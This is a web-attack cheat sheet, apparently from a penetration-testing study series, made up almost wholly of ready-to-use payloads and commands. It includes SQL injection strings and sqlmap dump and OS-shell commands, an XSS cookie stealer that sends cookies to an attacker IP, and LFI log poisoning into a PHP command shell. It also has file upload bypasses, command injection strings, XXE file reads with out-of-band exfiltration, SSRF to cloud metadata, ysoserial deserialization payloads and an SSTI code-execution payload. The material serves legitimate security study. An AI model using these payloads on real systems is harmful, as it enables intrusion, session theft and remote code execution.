# 06 — Web Attacks Cheat Sheet

## SQL Injection

```
' OR '1'='1
' OR '1'='1' -- -
' UNION SELECT 1,2,3 -- -
' UNION SELECT null,username,password FROM users -- -
```
Find column count: `' ORDER BY 1-- -` incrementing until error.

**Use sqlmap once you confirm injection manually (don't rely on it to find injection blind):**
```bash
sqlmap -u "http://target/page.php?id=1" --batch --dbs
sqlmap -u "http://target/page.php?id=1" -D dbname --tables
sqlmap -u "http://target/page.php?id=1" -D dbname -T users --dump
sqlmap -r request.txt --batch --level 5 --risk 3    # from Burp saved request, thorough
sqlmap -u "http://target/page.php?id=1" --os-shell   # if FILE/DBA privs
```

## XSS

```html
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```
Cookie stealer for blind XSS (submit to admin-viewed forms):
```html
<script>fetch('http://YOUR_IP/steal?c='+document.cookie)</script>
```
Catch with `python3 -m http.server` or `nc -lvnp 80`.

## Local File Inclusion (LFI)

```
http://target/index.php?page=../../../../etc/passwd
http://target/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
**LFI → RCE via log poisoning:**
```bash
# Inject PHP into User-Agent, then include the log
curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
http://target/index.php?page=/var/log/apache2/access.log&cmd=id
```
**LFI → RCE via PHP session file:**
```
http://target/index.php?page=/var/lib/php/sessions/sess_<PHPSESSID>
```

## File Upload Bypass

- Change extension: `.php` → `.pHp`, `.php5`, `.phtml`, `.php.jpg`
- Null byte (older PHP): `shell.php%00.jpg`
- Magic bytes: prepend `GIF89a;` to a PHP shell to bypass image content checks
- Content-Type spoof in Burp: change to `image/jpeg`
- Double extension: `shell.jpg.php`

## Command Injection

```
; id
| id
`id`
$(id)
%0a id       # newline injection
```
Blind: use time delay to confirm: `; sleep 5`

## XXE

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```
OOB exfil when direct read is blocked:
```xml
<!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://YOUR_IP/evil.dtd">%xxe;]>
```

## SSRF

```
http://target/fetch?url=http://127.0.0.1:80/admin
http://target/fetch?url=http://169.254.169.254/latest/meta-data/   # cloud metadata
```
Bypass filters: `http://127.1`, `http://0177.0.0.1`, `http://[::1]`, redirects via your own server.

## Insecure Deserialization

- PHP: look for `O:` serialized objects in cookies/params → craft gadget chain with `phpggc`
- Java: look for `rO0` (base64 of Java serialized object) → `ysoserial`
```bash
java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin
```

## Server-Side Template Injection (SSTI)

Fingerprint: `{{7*7}}` → 49 (Jinja2/Twig), `${7*7}` (Freemarker), `#{7*7}` (Ruby)
```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Burp Suite Workflow (use it, don't skip it)
1. Proxy every request through Burp.
2. Repeater for manual payload testing.
3. Intruder for fuzzing params (sniper/cluster bomb).
4. Save requests as `.txt` → feed straight to `sqlmap -r`.

## Quick Reference — Tools In This File

| Task | HTB-taught | Faster/better alternative |
|---|---|---|
| SQLi exploitation | manual union | `sqlmap` once confirmed (saves huge time on blind/time-based) |
| Deserialization | manual gadget building | `ysoserial` (Java), `phpggc` (PHP) — prebuilt gadget chains |
| General vuln sweep | manual only | `nuclei -tags sqli,xss,lfi,rce` as a fast first pass |

Next: `07-password-attacks.md`
